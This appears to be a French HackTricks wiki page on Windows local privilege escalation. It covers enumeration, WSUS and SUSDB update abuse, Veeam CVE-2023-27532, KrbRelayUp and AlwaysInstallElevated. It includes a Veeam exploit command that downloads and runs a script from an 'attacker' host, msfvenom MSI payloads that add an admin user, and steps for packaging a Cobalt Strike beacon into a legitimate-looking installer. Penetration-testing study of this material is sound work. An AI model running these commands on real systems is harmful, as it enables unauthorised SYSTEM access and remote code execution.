# Escalade de privilèges locaux Windows

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher des vecteurs d’escalade de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Cette page rassemble une méthodologie générale d’escalade de privilèges Windows issue de plusieurs guides fondamentaux.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Son processus pratique d’énumération s’appuie également sur des ateliers et des listes de vérification de la communauté.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Les techniques d’attaque historiques incluent la présentation de DerbyCon sur l’escalade de privilèges Windows.<sup>[[5]](#references)</sup>

## Notions fondamentales de Windows

### Jetons d’accès

**Si vous ne savez pas ce que sont les jetons d’accès Windows, consultez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d’informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveaux d’intégrité

**Si vous ne savez pas ce que sont les niveaux d’intégrité dans Windows, consultez la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Contrôles de sécurité Windows

Dans Windows, différents éléments peuvent **vous empêcher d’énumérer le système**, d’exécuter des exécutables ou même **détecter vos activités**. Vous devriez **lire** la **page** suivante et **énumérer** tous ces **mécanismes de défense** avant de commencer l’énumération en vue d’une escalade de privilèges :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Un accès physique peut également transformer une modification hors ligne de l’UEFI NVRAM en une chaîne d’attaque impliquant le DMA avant le démarrage et la modification de la mémoire Windows `SYSTEM` :

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Protection de l’administrateur / élévation silencieuse UIAccess

Les processus UIAccess lancés via `RAiLaunchAdminProcess` peuvent être détournés pour obtenir un niveau High IL sans invite lorsque les vérifications de chemin sécurisé d’AppInfo sont contournées. Consultez le processus dédié au contournement de UIAccess/Admin Protection ici :

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagation des paramètres d’accessibilité du registre Secure Desktop peut être détournée pour écrire arbitrairement dans le registre en tant que SYSTEM (RegPwn) :<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Les versions récentes de Windows ont également introduit une voie d’élévation de privilèges locale **SMB sur un port arbitraire**, où une authentification NTLM locale privilégiée est réfléchie via une connexion TCP SMB réutilisée :

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informations système

### Énumération des informations de version

Vérifiez si la version de Windows présente une vulnérabilité connue (vérifiez également les correctifs appliqués).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits de version

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données recense plus de 4 700 vulnérabilités de sécurité, ce qui montre la **surface d’attaque massive** que représente un environnement Windows.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas intègre watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventorie la version du système d’exploitation, les mises à jour installées et les candidats potentiels issus des avis de sécurité ; vérifiez le produit exact et les mises à jour qui remplacent les précédentes avant de considérer un résultat comme applicable.

Pour un exploit local spécifique à une version, vérifiez l’architecture du **processus en cours d’exécution** ainsi que celle du système d’exploitation. Sur Windows 64 bits, un processus 32 bits est soumis à la [redirection du système de fichiers WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) : `%windir%\System32` pointe généralement vers le répertoire système 32 bits, tandis que `%windir%\Sysnative` permet à ce processus d’accéder au répertoire système natif. Cet alias n’est pas disponible pour un processus 64 bits. Une version du système d’exploitation ou l’absence d’une mise à jour candidate ne prouve pas qu’un exploit est possible ; comparez la version en cours d’exécution, les mises à jour installées ou celles qui les remplacent, l’architecture du processus et les prérequis de l’exploit avec le [bulletin de sécurité Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) correspondant au problème exact.

**Localement, avec les informations système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts GitHub d’exploits :**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environnement

Des identifiants ou des infos Juicy sont-ils enregistrés dans les variables d’environnement ?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historique PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Fichiers de transcription PowerShell

Vous pouvez apprendre à l’activer ici : [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` n’est qu’un exemple. La [stratégie de transcription PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) écrit normalement les fichiers dans le dossier Documents de chaque utilisateur, mais un paramètre `OutputDirectory` ou `Start-Transcript -OutputDirectory` peut rediriger les fichiers vers un dossier partagé ou masqué. Vérifiez le chemin de sortie effectif et les ACL du fichier avant d’examiner une transcription : elle peut contenir des arguments de commande et des résultats, y compris des identifiants. Une transcription lisible ne constitue une piste que si son contenu révèle une identité de niveau de privilège supérieur exploitable et que cette identité peut se connecter dans le contexte concerné.

### PowerShell Module Logging

Les détails des exécutions du pipeline PowerShell sont enregistrés, notamment les commandes exécutées, les invocations de commandes et des parties des scripts. Toutefois, les détails complets de l’exécution et les résultats peuvent ne pas être capturés.

Pour activer cette fonctionnalité, suivez les instructions de la section « Transcript files » de la documentation et choisissez **« Module Logging »** plutôt que **« Powershell Transcription »**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Pour afficher les 15 derniers événements des journaux PowerShell, vous pouvez exécuter :

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Un enregistrement complet de l’activité et du contenu intégral du script est capturé pendant son exécution, afin que chaque bloc de code soit documenté au fur et à mesure. Ce processus conserve une piste d’audit détaillée de chaque activité, utile à la forensique et à l’analyse des comportements malveillants. En documentant toutes les activités au moment de leur exécution, il fournit des informations détaillées sur le processus.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Les événements de journalisation du Script Block se trouvent dans l’Observateur d’événements Windows, au chemin suivant : **Journaux des applications et des services > Microsoft > Windows > PowerShell > Opérationnel**.\
Pour afficher les 20 derniers événements, vous pouvez utiliser :

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Paramètres Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Lecteurs

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Les indications précédentes résumaient le risque ainsi :

Vous pouvez compromettre le système si les mises à jour sont demandées en http plutôt qu’en http**S**.

Un point de terminaison WSUS en HTTP constitue une piste à examiner pour une interception des métadonnées de mise à jour. L’exploitation dépend également du fait que le client utilise ce serveur WSUS, qu’un attaquant puisse intercepter ou contrôler son trafic, ainsi que des règles de confiance et d’installation des mises à jour du client. L’URL, à elle seule, ne permet pas d’établir qu’une exécution de code est possible. [Microsoft recommande TLS pour les métadonnées WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Commencez par vérifier si le réseau utilise une mise à jour WSUS sans SSL en exécutant la commande suivante dans cmd :

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ou ce qui suit dans PowerShell :

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Si vous obtenez une réponse telle que l'une de celles-ci :

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

La déclaration initiale concernant l'applicabilité était la suivante :

Alors, **c'est exploitable.** Si la dernière valeur de registre est égale à 0, l'entrée WSUS sera ignorée.

Lorsque `UseWUServer` vaut `1`, Windows Update utilise le service intranet configuré. Cela confirme un prérequis pour l'interception HTTP, mais ne prouve pas que l'interception, l'acceptation d'une mise à jour malveillante ou son installation avec des privilèges élevés soient possibles. Lorsque la valeur est `0`, ce point de terminaison WSUS configuré n'est pas sélectionné par cette stratégie.

Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils comme [Wsuxploit](https://github.com/pimps/wsuxploit) et [pyWSUS ](https://github.com/GoSecure/pywsus) : ce sont des scripts d'exploitation MiTM conçus pour injecter de fausses mises à jour dans le trafic WSUS non SSL.

Consultez la recherche ici :

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lisez le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
En résumé, voici la faille exploitée par ce bug :

> Si nous avons la possibilité de modifier le proxy de notre utilisateur local et que Windows Updates utilise le proxy configuré dans les paramètres d'Internet Explorer, nous pouvons alors exécuter [PyWSUS](https://github.com/GoSecure/pywsus) localement pour intercepter notre propre trafic et exécuter du code avec des privilèges élevés sur notre machine.
>
> De plus, comme le service WSUS utilise les paramètres de l'utilisateur actuel, il utilise également son magasin de certificats. Si nous générons un certificat auto-signé pour le nom d'hôte WSUS et ajoutons ce certificat au magasin de certificats de l'utilisateur actuel, nous pourrons intercepter le trafic WSUS HTTP et HTTPS. WSUS n'utilise aucun mécanisme similaire à HSTS pour mettre en place une validation du type « trust-on-first-use » du certificat. Si le certificat présenté est approuvé par l'utilisateur et comporte le nom d'hôte correct, le service l'acceptera.

Vous pouvez exploiter cette vulnérabilité à l'aide de l'outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu'il sera publié).

### Mises à jour contrôlées par l'administrateur WSUS

Une autre voie est possible lorsque l'identité actuelle peut **publier et approuver** des mises à jour sur un serveur WSUS. Vérifiez l'appartenance effective au groupe `WSUS Administrators` du serveur ainsi que les autorisations WSUS déléguées, puis identifiez le groupe d'ordinateurs clients qui recevrait une mise à jour approuvée. [Microsoft exige des privilèges d'administrateur WSUS pour approuver les mises à jour](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) et [documente la relation de confiance de publication](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29) : les clients doivent approuver le certificat de signature utilisé pour le contenu publié localement. Avant de considérer cette voie comme une possibilité d'escalade, vérifiez que la mise à jour candidate est signée et acceptée, qu'elle s'applique à la cible et qu'elle est installée dans un contexte plus privilégié. Une valeur HTTP `WUServer` ou un nom de groupe ne suffit pas, à lui seul, à établir ces conditions.

### Abus des mises à jour personnalisées SUSDB : charges utiles non signées via `.txt`/`.esd`

Il s'agit d'une défaillance distincte de la frontière de confiance, différente de l'interception d'une connexion WSUS HTTP : le prérequis est d'avoir un accès suffisant aux **procédures stockées de la base de données WSUS (`SUSDB`)** pour publier et approuver une mise à jour personnalisée. Une voie d'accès pratique consiste à relayer le compte d'ordinateur WSUS en amont vers un serveur MSSQL distinct hébergeant `SUSDB` ; le prérequis exact dépend du déploiement. Commencez donc par énumérer les autorisations `EXECUTE` au lieu de supposer qu'il faut des droits d'administrateur SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Pour découvrir la voie d'attaque distincte qui relaie l'authentification des clients WSUS depuis HTTP/8530 vers LDAP, SMB ou AD CS, consultez [Abus de WSUS HTTP pour un relais NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Confirmer le relais vers la base de données externe et les droits sur les procédures

Dans les déploiements où WSUS utilise un serveur SQL externe, vérifiez d'abord si le compte du serveur WSUS peut s'authentifier auprès de la base de données et si le relais NTLM atteint ce serveur. Le rôle SQL du serveur peut donner accès à des procédures de publication de mises à jour, même lorsque les écritures directes dans les tables sont refusées ; l'échec d'une requête `UPDATE` sur `SUSDB` ne prouve pas que la publication est bloquée. Avant de tenter de publier une mise à jour personnalisée, examinez l'identité effective, l'appartenance aux rôles et les autorisations sur les procédures dans une session SQL autorisée.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Les définitions de procédures en vigueur et le fichier `SoftwareDistributionPackage.xsd` installé sont utiles pour reconstituer des métadonnées de mise à jour valides. Un parent de bundle et un enfant payload doivent chacun avoir `UpdateIdentity` (type de fragment `1`), `LocalizedProperties` (`4`) et `ExtendedProperties` (`2`) ; récupérez l’identifiant de révision local renvoyé par chaque appel à `spImportUpdate` et assurez la cohérence de la relation de bundle, des digests, de la taille, de l’URL du contenu et de la révision. Il s’agit d’un workflow de publication avec état : un appel réussi à une procédure stockée ne prouve pas que l’exécution côté client a eu lieu.<sup>[[38]](#references)</sup>

#### Créer, cibler et approuver la mise à jour

Le workflow de mise à jour personnalisée utilise les procédures WSUS légitimes comme API de publication à accès restreint. Les principales transitions d’état sont les suivantes :<sup>[[38]](#references)</sup>

| Étape | Procédures stockées pertinentes |
| --- | --- |
| Importer les métadonnées de mise à jour | `spImportUpdate` |
| Stocker les fragments XML des prérequis, des propriétés localisées et des propriétés étendues | `spSaveXMLFragment` |
| Associer le digest du contenu à son URL contrôlée par l’attaquant | `spSetBatchURL` |
| Énumérer/créer un groupe d’ordinateurs et y ajouter le client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Approuver l’installation pour ce groupe | `spDeployUpdate` avec `@actionID = 0` et `@isAssigned = 1` |

Le nom du fichier, les digests, la taille et le gestionnaire `CommandLineInstallation` doivent être cohérents dans les métadonnées/fragments importés. Après avoir défini l’URL du contenu et le groupe cible, l’approbation finale ressemble à ce qui suit ; utilisez de nouveaux identifiants de mise à jour, de groupe et de déploiement plutôt que de réutiliser les GUID d’exemple.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Contournement de signature basé sur l’extension

WSUS rejette normalement tout contenu exécutable arbitraire non signé. Toutefois, dans `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, le chemin .NET `VerifyFile` définit le paramètre de vérification du certificat sur false lorsque le nom de fichier fourni se termine par `.txt` ou `.esd` ; `CheckCertificateSignature` est alors ignoré sans vérifier au préalable que les octets correspondent à du texte ou à une image ESD légitime. Ainsi, un PE inchangé nommé, par exemple, `payload.exe.txt` peut passer la vérification du contenu, puis être lancé par le gestionnaire d’installation en ligne de commande de la mise à jour. Il s’agit d’un bug de confusion de type/politique, et non d’une falsification de signature.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging et automatisation compatibles avec BITS

L’appel à `spDeployUpdate` amène WSUS à récupérer le contenu enregistré. L’origine doit respecter les exigences HTTP de BITS : une URL accessible ne suffit pas, car le transfert utilise une séquence initiale `HEAD`/`GET` ainsi que des requêtes par plage d’octets. Un serveur sans prise en charge des plages génère l’événement de synchronisation WSUS `EventId=364`, indiquant que BITS exige l’en-tête de protocole Range.<sup>[[39]](#references)</sup>

Le PoC de recherche [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) génère le SQL requis pour la chaîne import/fragment/URL/groupe/déploiement, inclut un client MSSQL modifié pour l’exécuter et fournit `BitsWebServer.py` pour le staging du contenu. Voici une invocation minimale dans un laboratoire autorisé :<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Exécution sans surveillance et persistance par nouvelle tentative

L’interaction côté client dépend de la stratégie. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, option `4 - Auto download and schedule install`, permet de télécharger et d’installer une mise à jour approuvée selon la planification configurée, sans que l’utilisateur ait à la sélectionner manuellement. Lors des tests, une charge utile dont la mise à jour restait en échec ou incomplète était immédiatement proposée à nouveau après la fermeture du processus de callback ; le mécanisme de nouvelle tentative peut donc devenir une persistance par exécution récurrente. Ce comportement est bruyant, car le client indique que la mise à jour a échoué.<sup>[[39]](#references)</sup>

#### Pistes de détection et de durcissement

Voici des pistes utiles côté serveur et côté client pour cette chaîne :<sup>[[39]](#references)</sup>

- Auditer l’exécution de `spCreateTargetGroup`, `spSetBatchURL` et `spDeployUpdate` dans `SUSDB` ; examiner les nouveaux groupes de ciblage, les origines de contenu externes, les charges utiles de mise à jour `.txt`/`.esd` et les déploiements effectués par des principaux inattendus (en particulier des comptes autres que des comptes d’ordinateur).
- Examiner `C:\Program Files\Update Services\LogFiles` à la recherche de `ContentSyncAgent`, `FileVerified`, de l’orthographe erronée `FileVerficationFailed` et de `EventId=364` ; corréler la vérification avec l’extension de la charge utile et la signature du contenu plutôt que de se fier au suffixe.
- Rechercher les échecs et nouvelles tentatives répétés d’installation de Windows Update, ainsi que l’exécution de PE ou toute activité inattendue de processus enfants ou réseau provenant de contenu portant les noms `.txt` ou `.esd`.
- Exiger Extended Protection for Authentication sur le service de base de données lorsque cette option est prise en charge, et limiter l’accès réseau à la base de données au serveur WSUS et aux systèmes d’administration autorisés. Réduire au minimum et auditer les droits `EXECUTE` sur les procédures de mise à jour personnalisées.

## Outils de mise à jour automatique tiers et IPC des agents (élévation de privilèges locale)

De nombreux agents d’entreprise exposent une interface IPC sur localhost et un canal de mise à jour privilégié. Si l’inscription peut être forcée à utiliser un serveur contrôlé par un attaquant et que le programme de mise à jour fait confiance à une autorité de certification racine rogue ou applique des contrôles de signature faibles, un utilisateur local peut fournir un MSI malveillant que le service SYSTEM installe. Voir ici une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) :


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

La description d’origine, spécifique à la version, et la note de reconnaissance étaient les suivantes :

Veeam B&R < `11.0.1.1261` expose un service localhost sur **TCP/9401** qui traite des messages contrôlés par un attaquant, permettant l’exécution de commandes en tant que **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Reconnaissance** : confirmer l’écoute et la version, par exemple avec `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication et Cloud Connect utilisent un service de sauvegarde central sur **TCP/9401 par défaut**. [L’avis de Veeam](https://www.veeam.com/kb4424) décrit la divulgation non authentifiée d’identifiants chiffrés de la base de données de configuration dans le périmètre réseau de sauvegarde ; un PoC public distinct démontre une voie d’exécution de commandes en tant que **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Le service peut écouter sur une adresse autre que localhost ; vérifiez donc son adresse effective et son PID.

- **Reconnaissance** : confirmer que TCP/9401 correspond à `Veeam.Backup.Service.exe`, puis examiner le produit installé et les métadonnées des correctifs. `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sont des indices, mais ne permettent pas de vérifier entièrement l’installation des correctifs.
- **Versions minimales corrigées** : Veeam indique **11a build 11.0.1.1261 P20230227** et **12 build 12.0.0.1420 P20230223** comme premières versions corrigées ; les versions antérieures sont affectées. Un numéro de version de fichier à quatre composants ne permet pas à lui seul de distinguer une build de base non corrigée d’un correctif ultérieur appliqué à cette même build. Vérifiez l’identifiant du correctif dans [l’historique des builds du fournisseur](https://www.veeam.com/kb2680) avant de considérer une build limite comme corrigée.
- **Exploit** : placez un PoC tel que `VeeamHax.exe` avec les DLL Veeam requises dans le même répertoire, puis déclenchez une charge utile SYSTEM via le socket local :

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Le service exécute la commande en tant que SYSTEM.

Le PoC cité démontre l'exécution de commandes en tant que SYSTEM lorsque ses prérequis supplémentaires sont réunis ; l'avis du fournisseur décrit le problème de divulgation d'identifiants.

## KrbRelayUp

La description d'origine de l'environnement par défaut était la suivante :

Une vulnérabilité d'**élévation locale de privilèges** existe dans les environnements Windows de **domaine** sous certaines conditions. Celles-ci comprennent les environnements où **la signature LDAP n'est pas imposée,** où les utilisateurs disposent de droits propres leur permettant de configurer **Resource-Based Constrained Delegation (RBCD)** et où les utilisateurs peuvent créer des ordinateurs dans le domaine. Il est important de noter que ces **prérequis** sont satisfaits avec les **paramètres par défaut**.

Un relais Kerberos local peut faire passer une session de connexion à privilèges moindres à une écriture privilégiée dans l'annuaire lorsqu'un serveur COM adapté s'authentifie et que le principal relayé dispose des droits nécessaires sur l'objet cible. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) both RBCD and `msDS-KeyCredentialLink` (shadow-credential) LDAP writes; KrbRelayUp automatise certaines de ces voies. Une chaîne RBCD nécessite des droits de délégation et sur l'objet cible qui s'appliquent, tandis qu'une chaîne shadow-credential nécessite des droits d'écriture sur les clés d'identification et un KDC prenant en charge le chemin d'authentification par certificat. Aucune de ces voies ne découle de la seule appartenance au domaine.

Vérifiez la stratégie du contrôleur de domaine (DC) réel concernant [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) et [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), la liste de contrôle d'accès (ACL) de l'objet pour l'identité relayée, ainsi que les niveaux d'authentification et d'usurpation d'identité de la classe COM sélectionnée. Le type de connexion de l'appelant et le contexte des identifiants sont importants : une session WinRM peut se comporter différemment d'une connexion interactive ou d'une connexion avec de nouveaux identifiants. Le routage par pare-feu/OXID et les mises à jour installées peuvent également modifier le résultat. Considérez une stratégie permissive ou une ACL correspondante comme un élément à examiner ; l'énumération passive ne doit pas déclencher de coercition COM, d'authentification par relais ni d'écriture dans l'annuaire. Un shadow credential de compte machine peut mener à un ticket machine et, uniquement si ce compte dispose des droits de réplication d'annuaire requis, à une voie DCSync distincte.

Trouvez l'**exploit dans** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Pour plus d'informations sur le déroulement de l'attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Si** ces 2 clés de registre sont **activées** (valeur **0x1**), les utilisateurs, quel que soit leur niveau de privilège, peuvent **installer** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Si vous disposez d’une session Meterpreter, vous pouvez automatiser cette technique à l’aide du module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de PowerUP pour créer dans le répertoire courant un binaire MSI Windows permettant d’élever les privilèges. Ce script génère un installateur MSI précompilé qui invite à ajouter un utilisateur ou un groupe (vous aurez donc besoin d’un accès GIU) :

```
Write-UserAddMSI
```

Exécutez simplement le binaire créé pour élever vos privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un wrapper MSI à l’aide de ces outils. Notez que vous pouvez encapsuler un fichier « **.bat** » si vous voulez **simplement** **exécuter** des **lignes de commande**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Créer un MSI avec WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Créer un MSI avec Visual Studio

- **Générez**, avec Cobalt Strike ou Metasploit, un **nouveau payload TCP Windows EXE** dans `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et saisissez « installer » dans la zone de recherche. Sélectionnez le projet **Setup Wizard**, puis cliquez sur **Next**.
- Donnez un nom au projet, par exemple **AlwaysPrivesc**, utilisez **`C:\privesc`** comme emplacement, sélectionnez **place solution and project in the same directory**, puis cliquez sur **Create**.
- Cliquez sur **Next** jusqu’à l’étape 3 sur 4 (choix des fichiers à inclure). Cliquez sur **Add** et sélectionnez le payload Beacon que vous venez de générer. Cliquez ensuite sur **Finish**.
- Sélectionnez le projet **AlwaysPrivesc** dans **Solution Explorer** et, dans **Properties**, définissez **TargetPlatform** sur **x64** au lieu de **x86**.
  - Vous pouvez modifier d’autres propriétés, comme **Author** et **Manufacturer**, afin de rendre l’application installée plus légitime.
- Faites un clic droit sur le projet et sélectionnez **View > Custom Actions**.
